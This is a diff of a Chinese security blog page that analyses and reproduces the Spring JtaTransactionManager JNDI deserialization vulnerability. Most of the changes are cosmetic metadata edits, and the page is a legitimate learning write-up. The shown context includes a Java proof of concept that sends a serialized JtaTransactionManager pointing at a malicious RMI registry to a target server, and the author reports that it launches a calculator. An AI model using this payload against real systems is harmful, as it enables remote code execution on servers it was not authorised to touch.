@@ -117,7 +117,7 @@
 <meta property="og:description" content="打包发布于安全客https://www.anquanke.com/post/id/173459  spring-jndi反序列化众所周知Spring框架是一款用途广泛影响深远的java框架，因此Spring框架一旦出现漏洞也是影响深远。这次分析的Spring jdni反序列化漏洞主要存在于spring-tx包中，该包中的org.springframeworkl.transation.jta.Jt">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79ly1g02nr05wyuj317r0o1qem.jpg">
-<meta property="og:updated_time" content="2019-07-06T15:27:08.122Z">
+<meta property="og:updated_time" content="2019-03-22T00:32:27.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Spring-jndi 反序列化漏洞分析复现">
 <meta name="twitter:description" content="打包发布于安全客https://www.anquanke.com/post/id/173459  spring-jndi反序列化众所周知Spring框架是一款用途广泛影响深远的java框架，因此Spring框架一旦出现漏洞也是影响深远。这次分析的Spring jdni反序列化漏洞主要存在于spring-tx包中，该包中的org.springframeworkl.transation.jta.Jt">
@@ -178,7 +178,7 @@
 
 </head>
 
-<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
 	<a href="https://github.com/imagemlt"><img style="position: absolute; top: 0; right: 0; border: 0;z-index:1" src="https://s3.amazonaws.com/github/ribbons/forkme_right_orange_ff7600.png" alt="Fork me on GitHub"></a>
   
   
@@ -188,7 +188,7 @@
   <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
-    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
       <div class="header-inner"><div class="site-brand-wrapper">
   <div class="site-meta ">
     
@@ -314,20 +314,20 @@
 
   
 
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
   
   
   
   <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/java-unserialize-learning-2/index.html">
 
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Imagemlt">
       <meta itemprop="description" content="personal blog">
       <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
     </span>
 
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="Image's blog">
     </span>
 
@@ -378,7 +378,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-07-06 23:27:08" itemprop="dateModified" datetime="2019-07-06T23:27:08+08:00">2019-07-06</time>
+                <time title="Modified: 2019-03-22 08:32:27" itemprop="dateModified" datetime="2019-03-22T08:32:27+08:00">2019-03-22</time>
               
             
           </span>
@@ -438,7 +438,7 @@
 <h3 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h3><p>这个漏洞的Poc构造比起之前分析的apache common collections反序列化的Poc构造显然要简单许多：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(<span class="string">"Connecting to server "</span>+serverAddress+<span class="string">":"</span>+port);</span><br><span class="line">Socket socket=<span class="keyword">new</span> Socket(serverAddress,port);</span><br><span class="line">System.out.println(<span class="string">"Connected to server"</span>);</span><br><span class="line">String jndiAddress = <span class="string">"rmi://127.0.0.1:1099/Object"</span>;<span class="comment">//恶意的rmi注册源</span></span><br><span class="line">			</span><br><span class="line">org.springframework.transaction.jta.JtaTransactionManager object = <span class="keyword">new</span> org.springframework.transaction.jta.JtaTransactionManager();</span><br><span class="line">object.setUserTransactionName(jndiAddress);</span><br><span class="line">			</span><br><span class="line">System.out.println(<span class="string">"Sending object to server..."</span>);</span><br><span class="line">ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(socket.getOutputStream());</span><br><span class="line">objectOutputStream.writeObject(object);</span><br><span class="line">objectOutputStream.flush();</span><br></pre></td></tr></table></figure>
 <p>执行后可以发现成功弹出计算器。</p>
-<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1g02nr05wyuj317r0o1qem.jpg" alt=""></p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1g02nr05wyuj317r0o1qem.jpg" alt></p>
 <h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://blog.csdn.net/wn084/article/details/80729230">https://blog.csdn.net/wn084/article/details/80729230</a></p>
 <p><a href="https://github.com/zerothoughts/spring-jndi">https://github.com/zerothoughts/spring-jndi</a></p>
 
@@ -547,7 +547,7 @@
 
       <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
               <img class="site-author-image" itemprop="image" src="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4" alt="Imagemlt">
             
@@ -605,9 +605,7 @@
                     
                       
                     
-                      
-                    
-                    <span class="site-state-item-count">16</span>
+                    <span class="site-state-item-count">15</span>
                     <span class="site-state-item-name">categories</span>
                   </a>
                 </div>
@@ -642,9 +640,7 @@
                     
                       
                     
-                      
-                    
-                    <span class="site-state-item-count">12</span>
+                    <span class="site-state-item-count">11</span>
                     <span class="site-state-item-name">tags</span>
                   </a>
                 </div>
